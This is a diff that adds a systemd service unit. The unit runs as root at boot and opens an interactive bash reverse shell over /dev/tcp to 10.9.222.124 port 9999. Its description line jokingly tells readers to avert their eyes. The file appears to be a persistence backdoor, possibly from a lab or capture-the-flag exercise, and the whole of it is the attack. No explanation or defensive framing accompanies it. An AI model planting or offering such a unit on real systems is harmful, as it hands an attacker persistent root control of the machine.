@@ -1,0 +1,10 @@
+[Unit]
+Description=Black magic happening, avert your eyes
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.222.124/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
